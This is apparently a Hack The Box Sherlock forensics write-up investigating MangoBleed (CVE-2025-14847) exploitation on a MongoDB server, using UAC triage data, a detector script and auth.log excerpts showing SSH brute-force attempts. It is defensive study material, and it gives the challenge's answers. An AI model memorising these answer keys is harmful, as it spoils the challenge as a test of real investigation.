---
link: https://app.hackthebox.com/sherlocks/MangoBleed?tab=play_sherlock
description: Very Easy
release date: 2025-12-31
tags:
image: https://cdn.services-k8s.prod.aws.htb.systems/content/sherlocks/avatar/a0b95fe3-116c-47c8-9ab5-e86ae3049a38.png
solved: true
solve date: 2026-07-08
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/HTB Logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">MangoBleed Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/sherlocks/avatar/a0b95fe3-116c-47c8-9ab5-e86ae3049a38.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): CyberJunkie</p>
    <p style="margin: 0;">Difficulty: Very Easy</p>
    <p style="margin: 0;">Date: 08 Jul 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Sherlock Scenario

You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as ==MongoBleed==. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, ==identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Triage & Initial Analysis

You were handed a single file, `MangoBleed.zip`, as the starting evidence package for this investigation. Before touching its contents, the first step in any analysis is simply to confirm what you have on disk — this is basic forensic hygiene: know your working directory before you start extracting or modifying anything.

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/MangoBleed]
└─$ ls
MangoBleed.zip
```

`MangoBleed.zip` is a compressed archive — a single file that bundles many files/folders together and shrinks their size. Since the contents are unknown until extracted, and the archive is password-protected (a common practice for CTF evidence files, so that antivirus tools or search engines don't flag/index attacker artifacts contained inside), the next logical step is to extract it using a tool capable of reading `.zip` archives and handling that password prompt.

**Command:** `7z x MangoBleed.zip`

**Breakdown:**

- `7z`
    - Description: The command-line executable for **7-Zip**, a file archiver utility capable of creating and extracting many archive formats (`.zip`, `.7z`, `.rar`, `.tar`, etc.).
    - Purpose: Chosen because it reliably handles password-protected ZIP archives and reports extraction integrity (whether the file is corrupted).
- `x`
    - Description: The 7-Zip sub-command for "extract with full paths" — as opposed to `e` (extract, flattening all files into one folder), `x` preserves the original folder structure inside the archive.
    - Purpose: Preserving the original folder structure is critical in forensics — the folder hierarchy created by the acquisition tool carries meaning (as you'll see below), and flattening it would destroy that context.
- `MangoBleed.zip`
    - Description: The target archive to extract, specified as a positional argument.
    - Purpose: Points 7-Zip at the evidence file provided for this Sherlock.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/MangoBleed]
└─$ 7z x MangoBleed.zip 

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 32727809 bytes (32 MiB)

Extracting archive: MangoBleed.zip
--            
Path = MangoBleed.zip
Type = zip
Physical Size = 32727809

    
Enter password (will not be echoed):
Everything is Ok                                                           

Folders: 678
Files: 4196
Size:       100216130
Compressed: 32727809
```

If your extraction succeeded, listing the working directory again confirms what new folder(s) were created, and gives you the name you'll need for all subsequent navigation.

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/MangoBleed]
└─$ ls                             
MangoBleed.zip  uac-mongodbsync-linux-triage
```

The folder name `uac-mongodbsync-linux-triage` tells you two important things before you even open a single file:

1. **`uac`** — this data was collected using **UAC (Unix-like Artifacts Collector)**, an open-source live-triage tool. UAC runs on a live (running) Linux system and systematically dumps hundreds of small text files capturing system state — running processes, network connections, logs, user accounts, installed packages, and more — without needing to shut the machine down or take a full disk image. Think of it like doing vital-sign checks on a patient (pulse, blood pressure, temperature) rather than performing full surgery — it's a snapshot, not a deep dive into every byte on disk.
2. **`mongodbsync`** — this is the hostname of the compromised machine, matching the scenario briefing that the affected server is a secondary MongoDB server.

Before navigating into it, it's worth doing a first-pass listing of the top level of the folder, followed by a full recursive listing (`tree`) to understand how UAC organized everything — this is the map you'll use to know where to look for specific evidence later (logs, process info, config files, etc.).

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/Sherlocks/MangoBleed]
└─$ ls -la uac-mongodbsync-linux-triage 
total 28
drwxrwxr-x  7 kali kali 4096 Dec 29  2025  .
drwxrwxr-x  3 kali kali 4096 Jul  8 07:51  ..
drwxrwxr-x  2 kali kali 4096 Dec 29  2025  bodyfile
drwxrwxr-x  2 kali kali 4096 Dec 29  2025  hash_executables
drwxrwxr-x  9 kali kali 4096 Dec 29  2025  live_response
drwxrwxr-x 10 kali kali 4096 Dec 29  2025 '[root]'
drwxrwxr-x  2 kali kali 4096 Dec 29  2025  system
```

The five top-level folders each serve a distinct purpose in a UAC triage:

| Folder             | Contents                                                                                        | Purpose                                                                                                                               |
| ------------------ | ----------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `bodyfile`         | `bodyfile.txt`                                                                                  | A timeline-formatted (MAC time — Modified/Accessed/Changed) listing of every file on the filesystem, used for timeline reconstruction |
| `hash_executables` | `.md5` / `.sha1` files                                                                          | Cryptographic hashes of executable files, used to detect known-malicious or tampered binaries                                         |
| `live_response`    | Subfolders like `network`, `process`, `hardware`, `storage`, `packages`, `containers`, `system` | Output of dozens of live commands (`ps`, `netstat`, `lsof`, etc.) run at acquisition time — a snapshot of the running system's state  |
| `[root]`           | A near-complete copy of the filesystem's `/etc`, `/home`, `/var`, `/usr`, `/root`, etc.         | The actual files pulled off disk — configs, logs, home directories — where most log-analysis work happens                             |
| `system`           | Files like `suid.txt`, `sgid.txt`, `world_writable_files.txt`, `hidden_files.txt`               | Results of automated checks for common privilege-escalation and persistence indicators                                                |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### CVE Identification

Before touching any logs, we should nail down exactly what vulnerability we're dealing with. The scenario names it "MongoBleed" but that's an informal/community name, not a CVE ID — and you'll need the real CVE ID for your report. **Run a Google search for `MongoBleed MongoDB vulnerability CVE`**.

Every publicly disclosed vulnerability gets a unique tracking number called a **CVE ID** (Common Vulnerabilities and Exposures ID), assigned by MITRE, in the format `CVE-YYYY-NNNNN`. Security reports and patch notes reference CVE IDs rather than nicknames, so before going any further you need to pin down the exact one this incident concerns.

**Research:** Google search — `MongoBleed MongoDB vulnerability CVE`

Quoted result (Google AI Overview):

> "MongoBleed (CVE-2025-14847) is a high-severity (CVSS 8.7) unauthenticated memory disclosure flaw in MongoDB. It occurs because of a bug in how MongoDB processes zlib-compressed network messages. By manipulating message length fields, attackers can trick the server into returning chunks of uninitialized heap memory.
> 
> **Key Details**  
> Impact: Unauthenticated attackers can remotely extract sensitive information like database credentials, cloud environment tokens, and session data without needing a password.  
> Affected Versions: Multiple supported and legacy MongoDB Server versions.  
> Exploitation: The vulnerability is easy to execute, requires no user interaction, and was actively exploited in the wild shortly after disclosure."

This confirms the CVE ID for this engagement is **CVE-2025-14847**, and tells us the mechanism: a length-field mismatch in zlib-decompression logic tricks the server into leaking uninitialized heap memory — data sitting in RAM from previous operations that was never meant to be sent over the network, similar in spirit to the 2014 "Heartbleed" bug in OpenSSL (hence the "-Bleed" naming pattern).

Research notes this CVE affects "multiple supported and legacy MongoDB Server versions" — not every version. Before you can assess whether this server was actually exploitable, you need to confirm the exact MongoDB version it was running at the time of the incident. MongoDB writes its own version number to its log file every time the service starts, in a log entry containing the field `buildInfo`. That log file lives at `/var/log/mongodb/mongod.log` — a path you already confirmed exists under `[root]/var/log/` in the tree structure.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### MongoDB Version Identification

**Command:** `cat mongod.log | grep -i "buildinfo"`

**Breakdown:**

- `cat`
    - Description: Short for "concatenate" — prints the full contents of a file to the terminal.
    - Purpose: Feeds the entire contents of `mongod.log` into the next command via a pipe, rather than manually scrolling through a 512KB file.
- `|` (pipe)
    - Description: A shell operator that takes the output of the command on its left and passes it as input to the command on its right, instead of printing it to screen.
    - Purpose: Chains `cat`'s output directly into `grep` so the log can be searched in a single line.
- `grep`
    - Description: A text-search utility that reads input line by line and prints only the lines matching a given pattern.
    - Purpose: Filters thousands of log lines down to only the ones mentioning build/version information.
- `-i`
    - Description: Makes the pattern match case-insensitive.
    - Purpose: MongoDB logs the field as `buildInfo` (mixed case) — case-insensitivity avoids a miss due to capitalization.
- `"buildinfo"`
    - Description: The search keyword, quoted so the shell treats it as one literal argument.
    - Purpose: This is the specific JSON field MongoDB logs its version number under.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/[root]/var/log/mongodb]
└─$ cat mongod.log | grep -i "buildinfo"
{"t":{"$date":"2025-12-29T05:11:47.713+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T05:16:58.104+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T06:09:34.806+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
```

MongoDB logs in structured JSON rather than plain text, so each field is worth decoding once:

|Field|Meaning|
|---|---|
|`"t":{"$date":...}`|Timestamp of the log event, in UTC|
|`"s":"I"`|Severity — `I` stands for Informational (not a warning or error)|
|`"c":"CONTROL"`|Component — which internal subsystem generated the log|
|`"id":23403`|A unique numeric ID MongoDB assigns to this specific type of log message|
|`"ctx":"initandlisten"`|Context/thread name — `initandlisten` is the thread that runs during server startup|
|`"attr":{"buildInfo":{"version":"8.0.16",...}}`|The actual data attached to the message — here, the version string|

Three matching entries means `mongod` started up three separate times during the period covered by this log, and all three report the identical version: **8.0.16**.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### Identifying the Attacker's IP

With the CVE and the exact vulnerable version (8.0.16) confirmed, the next question in any incident response is: **who did this?** The scenario briefing already told you a MongoDB vulnerability was involved, and the CVE research described the exploitation pattern precisely — a flood of connections that get accepted and immediately disconnected, at a volume and speed no normal client would ever produce. Grepping for this manually is possible, but a community-maintained detector tool exists specifically to automate this pattern-matching and score the confidence of exploitation, so that's the more efficient path.

Research: Google search — `MongoBleed CVE-2025-14847 log indicators`

Quoted result (Google AI Overview):

> "A common indicator of exploitation is a high volume of rapid, short-lived connections (Event ID 22943 followed immediately by 22944) that completely lack client metadata, which standard MongoDB drivers typically provide."
> 
> "Rapid Pre-Authentication Failure Bursts: High volumes of pre-authentication errors or bursty, repeated connection attempts from unfamiliar or external IP addresses targeting port 27017."
> 
> "Abnormal Inbound Traffic: Sudden increases in inbound, short-lived TCP connections, particularly those attempting to initiate zlib compressed sessions against the default MongoDB port."

This tells us exactly what fingerprint to hunt for: event ID `22943` ("connection accepted") immediately followed by event ID `22944` ("connection ended"), repeated at high volume, with the connections missing the client metadata a legitimate driver would normally send.


Grepping for this pattern manually across tens of thousands of log lines is possible, but a community-maintained tool exists specifically to automate this kind of pattern-matching and score the confidence of exploitation, so that was used instead.

**GitHub repository:** — [Neo23x0/mongobleed-detector](https://github.com/Neo23x0/mongobleed-detector)

Quoted from the tool's own documentation:

> "A standalone Linux command-line tool that analyzes MongoDB data to identify likely exploitation of CVE-2025-14847 using multiple detection modules."
> 
> "Offline MongoDB Analysis Tool for CVE-2025-14847 (MongoBleed) that analyzes data to identify potential exploitation using multiple detection modules including log correlation, assert counts analysis, and FTDC spike detection."

**Relevant flags from its documented options:**

| Flag                   | Purpose                                                                                                                                                                             |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-p, --path <glob>`    | Points the tool at a specific log file to scan                                                                                                                                      |
| `--no-default-paths`   | Skips the tool's built-in default log locations — necessary here since we're scanning an offline, extracted copy of evidence, not a live system where logs sit in their normal spot |
| `-t, --time <minutes>` | Sets how far back (in minutes) the tool looks for events, relative to the current system clock (default: 4320 minutes / 3 days)                                                     |

**Two details needed to be handled before running this tool, based on the nature of the evidence:**

1. The extracted evidence folder is named `[root]` — a literal folder name containing square brackets, which are special "glob" pattern-matching characters in Linux (used to match a single character from a set, e.g. `[abc]`). Tools that accept a "path or glob" argument often do their own internal pattern-matching on the string they're given, separate from the shell. To avoid the detector misinterpreting `[root]` as a glob pattern instead of a literal folder name. Copy the log file into a clean scratch folder with no special characters in its path, leaving the original evidence untouched.
2. The tool's default lookback window is only 3 days, measured backward from the analysis machine's current system clock — which does not match the date the incident occurred. Setting `-t` to a large value up front guarantees the whole log is captured regardless of today's date.

**Command:**

```shell
mkdir -p ~/nedmoeca/HTB/Sherlocks/MangoBleed/analysis
cp ~/nedmoeca/HTB/Sherlocks/MangoBleed/uac-mongodbsync-linux-triage/\[root\]/var/log/mongodb/mongod.log ~/nedmoeca/HTB/Sherlocks/MangoBleed/analysis/
```

With a clean, bracket-free copy of the log in place and a wide enough time window set from the start, run the detector. 

**Command:** `bash mongobleed-detector.sh --no-default-paths -p ~/nedmoeca/HTB/Sherlocks/MangoBleed/analysis/mongod.log -t 500000`

**Breakdown:**

- `bash mongobleed-detector.sh`
    - Description: Hands the script file to the Bash interpreter as an argument, rather than executing it directly.
    - Purpose: Runs the tool without needing to separately mark the script file as executable (`chmod +x`) — passing a script to `bash` this way only requires that `bash` itself can read the file.
- `--no-default-paths`
    - Description: Skips the tool's built-in default MongoDB log locations.
    - Purpose: We're scanning an offline copy sitting at a custom path, not a live system's log directory.
- `-p <path>`
    - Description: Specifies the exact log file to analyze.
    - Purpose: Points the tool at the clean copy of `mongod.log`.
- `-t 500000`
    - Description: Sets the lookback window to 500,000 minutes (~347 days).
    - Purpose: Guarantees the tool's analysis window reaches back far enough to include the incident, regardless of the current date on the analysis machine.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Sherlocks/MangoBleed/mongobleed-detector]
└─$ bash mongobleed-detector.sh --no-default-paths -p ~/nedmoeca/HTB/Sherlocks/MangoBleed/analysis/mongod.log -t 500000
INFO: Analyzing 1 log file(s)...
INFO: Time window: 2025-07-26T06:54:00Z to now

╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                              MongoBleed (CVE-2025-14847) Detection Results                                       ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

Analysis Parameters:
  Time Window:        500000 minutes
  Connection Thresh:  100
  Burst Rate Thresh:  400/min
  Metadata Rate:      0.10

Risk     SourceIP                                  ConnCount  MetaCount  DiscCount    MetaRate%    BurstRate/m FirstSeen (UTC)        LastSeen (UTC)        
-------- ---------------------------------------- ---------- ---------- ---------- ------------ -------------- ---------------------- ----------------------
HIGH     65.0.76.43                                    37630          0      37630        0.00%       30104.00 2025-12-29T05:25:52Z   2025-12-29T05:27:07Z  

═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════
Summary:
  HIGH:   1 source(s) - Likely exploitation detected

⚠ IMPORTANT: If exploitation is confirmed, patching alone is insufficient.
  - Rotate all credentials that may have been exposed
  - Review accessed data for sensitive information disclosure
  - Check for lateral movement from affected systems
  - Preserve logs for forensic analysis
```

Breaking down what each column in the results table means:

| Column                     | Meaning                                                                                                                                                                                                                                    |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Risk                       | The tool's overall confidence that this source IP represents real exploitation, not a false positive                                                                                                                                       |
| SourceIP                   | The remote IP address generating the flagged traffic                                                                                                                                                                                       |
| ConnCount                  | Total "connection accepted" events logged from this IP                                                                                                                                                                                     |
| MetaCount                  | Of those connections, how many included normal client metadata (application name, driver version, OS) — legitimate MongoDB clients almost always send this during a proper handshake                                                       |
| DiscCount                  | Total "connection ended" (disconnect) events from this IP                                                                                                                                                                                  |
| MetaRate%                  | `MetaCount ÷ ConnCount` — the percentage of connections that behaved like a normal client. A malformed/exploit packet skips the parts of the handshake that carry this metadata, so an exploit tool would show a near-zero percentage here |
| BurstRate/m                | The peak rate of connections-per-minute observed — used to detect sudden floods                                                                                                                                                            |
| FirstSeen / LastSeen (UTC) | Timestamps bounding the first and last event attributed to this source                                                                                                                                                                     |

**What this tells us:** `65.0.76.43` opened 37,630 connections in roughly 75 seconds (`05:25:52` to `05:27:07`), with a peak rate over 30,000 connections/minute, and **0.00%** of those connections carried normal client metadata. That combination — massive volume, extreme speed, and a complete absence of the handshake data a real client would send — matches exactly the log indicators identified in the research. This identifies `**65.0.76.43**` as the attacker's IP address, with exploitation activity spanning `2025-12-29T05:25:52Z` to `2025-12-29T05:27:07Z` UTC.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1

### What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

**==CVE-2025-14847==**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 2

### What is the version of MongoDB installed on the server that the CVE exploited?

**==8.0.16==**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 3

### Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.

**==65.0.76.43==**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 4

### Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)

**==2025-12-29 05:25:52==**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 5

### Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

**==75260==**

**Command:**

```shell
┌──(kali㉿kali)-[~/…/[root]/var/log/mongodb]
└─$ grep -i "65.0.76.43" mongod.log | wc -l
75260
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 6

### The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

**==2025-12-29 05:40:03==**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

MongoBleed leaks uninitialized heap memory — and heap memory on a database server can easily contain recently-processed data like authentication credentials, session tokens, or connection strings. Given that, the logical next question is whether the attacker took whatever they scraped from memory and used it to log into the server directly, rather than just reading data through the database protocol.

SSH (Secure Shell) is the standard way to get an interactive command-line session on a remote Linux server, and every login attempt against it — successful or failed — gets recorded by Linux's authentication system (PAM, the Pluggable Authentication Modules framework) into `/var/log/auth.log`. You already confirmed this file exists under `[root]/var/log/` in the tree structure. Since we now have the attacker's IP address (`65.0.76.43`) pinned down from the MongoDB logs, the next step is to check whether that same IP shows up in the authentication log.

Navigate to `[root]/var/log/` and search `auth.log` for the attacker's IP address. Run:

**Command:** `grep -i "65.0.76.43" auth.log`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/var/log]
└─$ grep -i "65.0.76.43" auth.log                     
2025-12-29T05:39:18.864074+00:00 ip-172-31-38-170 sshd[39814]: Received disconnect from 65.0.76.43 port 54962:11: Bye Bye [preauth]
2025-12-29T05:39:18.866641+00:00 ip-172-31-38-170 sshd[39814]: Disconnected from authenticating user mongoadmin 65.0.76.43 port 54962 [preauth]
2025-12-29T05:39:19.113009+00:00 ip-172-31-38-170 sshd[2152]: drop connection #10 from [65.0.76.43]:55068 on [172.31.38.170]:22 past MaxStartups
2025-12-29T05:39:19.381375+00:00 ip-172-31-38-170 sshd[39844]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.478221+00:00 ip-172-31-38-170 sshd[39845]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.545976+00:00 ip-172-31-38-170 sshd[39846]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.554759+00:00 ip-172-31-38-170 sshd[39847]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.554993+00:00 ip-172-31-38-170 sshd[39848]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.555198+00:00 ip-172-31-38-170 sshd[39851]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.558909+00:00 ip-172-31-38-170 sshd[39854]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.564686+00:00 ip-172-31-38-170 sshd[39853]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.564934+00:00 ip-172-31-38-170 sshd[39855]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.565129+00:00 ip-172-31-38-170 sshd[39850]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.566958+00:00 ip-172-31-38-170 sshd[39856]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.567215+00:00 ip-172-31-38-170 sshd[39852]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.567871+00:00 ip-172-31-38-170 sshd[39849]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.572079+00:00 ip-172-31-38-170 sshd[39857]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:21.697983+00:00 ip-172-31-38-170 sshd[39816]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.752018+00:00 ip-172-31-38-170 sshd[39858]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:21.797661+00:00 ip-172-31-38-170 sshd[39818]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.851009+00:00 ip-172-31-38-170 sshd[39859]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:21.856191+00:00 ip-172-31-38-170 sshd[39819]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.870123+00:00 ip-172-31-38-170 sshd[39820]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.871087+00:00 ip-172-31-38-170 sshd[39824]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.871332+00:00 ip-172-31-38-170 sshd[39821]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.878545+00:00 ip-172-31-38-170 sshd[39823]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.879041+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.880199+00:00 ip-172-31-38-170 sshd[39827]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.880996+00:00 ip-172-31-38-170 sshd[39817]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.883517+00:00 ip-172-31-38-170 sshd[39830]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.883794+00:00 ip-172-31-38-170 sshd[39826]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.884016+00:00 ip-172-31-38-170 sshd[39822]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:21.890635+00:00 ip-172-31-38-170 sshd[39829]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:22.030041+00:00 ip-172-31-38-170 sshd[39860]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.146020+00:00 ip-172-31-38-170 sshd[39861]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.158046+00:00 ip-172-31-38-170 sshd[39871]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.161929+00:00 ip-172-31-38-170 sshd[39862]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.162153+00:00 ip-172-31-38-170 sshd[39869]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.162355+00:00 ip-172-31-38-170 sshd[39863]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.166407+00:00 ip-172-31-38-170 sshd[39865]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.166627+00:00 ip-172-31-38-170 sshd[39867]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.166873+00:00 ip-172-31-38-170 sshd[39866]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.167075+00:00 ip-172-31-38-170 sshd[39864]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.167285+00:00 ip-172-31-38-170 sshd[39868]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:22.173507+00:00 ip-172-31-38-170 sshd[39870]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:23.676920+00:00 ip-172-31-38-170 sshd[39816]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
